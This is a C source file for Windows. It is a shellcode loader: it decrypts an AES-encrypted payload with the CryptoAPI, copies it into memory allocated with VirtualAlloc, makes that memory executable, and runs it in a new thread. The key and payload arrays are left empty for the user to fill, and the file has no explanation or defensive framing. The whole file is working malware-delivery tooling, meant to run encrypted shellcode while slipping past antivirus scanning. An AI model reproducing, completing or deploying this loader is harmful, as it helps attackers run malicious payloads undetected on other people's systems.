#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

#pragma comment(lib, "ntdll")


void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main(int argc, char** argv) {

    unsigned char AESkey[] = { };
	unsigned char AESshellcode[] = { };
    DWORD payload_length = sizeof(AESshellcode);
    
    DecryptAES((char*)AESshellcode, payload_length, AESkey, sizeof(AESkey));

    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(AESshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	
	MoveMemory(alloc_mem, AESshellcode, sizeof(AESshellcode));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(AESshellcode), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	((void(*)())alloc_mem)();

	return 0;
}

